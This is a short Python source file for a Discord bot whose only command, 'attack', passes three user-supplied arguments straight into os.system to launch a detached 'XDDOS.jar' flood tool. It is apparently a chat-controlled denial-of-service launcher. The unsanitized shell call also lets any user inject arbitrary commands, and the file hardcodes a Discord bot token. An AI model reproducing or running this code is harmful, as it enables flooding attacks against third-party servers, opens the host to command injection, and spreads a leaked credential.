import json
from urllib.request import urlopen
import discord
import threading
from discord.ext import commands
import os
import random
token = "MTA0ODEyODI1ODk0MTY2NTM3MQ.GlX5Zb.zow7O8x5YBQxDBKFV0-3xQ2eTvQaDu_7SYgr_I"
client = commands.Bot(command_prefix='xd!',intents=discord.Intents.all()) 
client.remove_command('help')
@client.command()
async def attack(ctx, arg1, arg2, arg3):
    os.system(f'screen -d -m java -jar XDDOS.jar {arg1} {arg2} {arg3} 120 -1 y')
client.run(token)
